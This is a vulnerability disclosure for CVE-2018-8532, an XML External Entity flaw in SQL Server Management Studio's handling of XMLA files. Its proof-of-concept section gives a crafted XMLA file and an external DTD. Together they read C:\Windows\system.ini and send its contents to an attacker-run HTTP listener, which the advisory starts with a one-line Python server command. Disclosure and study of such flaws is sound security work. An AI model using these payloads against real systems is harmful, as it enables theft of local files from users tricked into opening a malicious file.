[Product]
SQL Server Management Studio 17.9
SQL Server Management Studio 18.0 (Preview 4)

SQL Server Management Studio is a software application first launched
with Microsoft SQL Server 2005 that is used for configuring, managing,
and administering
all components within Microsoft SQL Server. The tool includes both
script editors and graphical tools which work with objects and
features of the server.



[Vulnerability Type]
XML External Entity Injection



[CVE Reference]
CVE-2018-8532


[Security Issue]
This vulnerability allows remote attackers to disclose sensitive
information on vulnerable installations of Microsoft SQL Server
Management Studio.
User interaction is required to exploit this vulnerability in that the
target must visit a malicious page or open a malicious file.

The specific flaw exists within the handling of XMLA files. Due to the
improper restriction of XML External Entity (XXE) references, a
specially crafted
document specifying a URI causes the XML parser to access the URI and
embed the contents back into the XML document for further processing.
An attacker can leverage this vulnerability to disclose information in
the context of the current process.


[Exploit/POC]

1) python -m SimpleHTTPServer

2) "test.xmla"

<?xml version="1.0"?>
<!DOCTYPE tastyexploits [
<!ENTITY % file SYSTEM "C:\Windows\system.ini">
<!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/payload.dtd">
%dtd;]>
<pwn>&send;</pwn>


3) "payload.dtd"

<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8000?%file;'>">
%all;
